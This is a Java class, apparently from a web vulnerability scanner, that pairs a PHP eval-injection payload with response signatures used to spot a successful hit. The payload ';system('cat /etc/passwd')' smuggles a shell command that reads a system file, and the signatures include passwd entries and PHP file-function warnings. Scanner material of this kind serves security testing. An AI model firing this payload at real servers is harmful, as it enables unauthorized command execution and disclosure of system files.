/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package PayloadSignature.A6VulnerableandOutdatedComponents;

/**
 *
 * @author shacojx
 */
public class PHP_Eval {

    private String[] payload;
    private String[] Signature;

    public PHP_Eval() {
        payload = new String[]{
            ";system(%27cat%20/etc/passwd%27)",};
        Signature = new String[]{
            "root:x:0:0",
            "root:*:0:0",
            "www-data:x:",
            "[boot loader]",
            "java.io.FileNotFoundException:",
            "fread(): supplied argument is not",
            "fpassthru(): supplied argument is not",
            "for inclusion (include_path=",
            "Failed opening required",
            "Warning: file(", "file()",
            "<b>Warning</b>:  file(",
            "Warning: readfile(",
            "<b>Warning:</b>  readfile(",
            "Warning: file_get_contents(",
            "<b>Warning</b>:  file_get_contents(",
            "Warning: show_source(",
            "<b>Warning:</b>  show_source(",
            "Warning: highlight_file(",
            "<b>Warning:</b>  highlight_file(",
            "System.IO.FileNotFoundException:",};
    }

    public String[] getPayload() {
        return payload;
    }

    public String[] getSignature() {
        return Signature;
    }
}
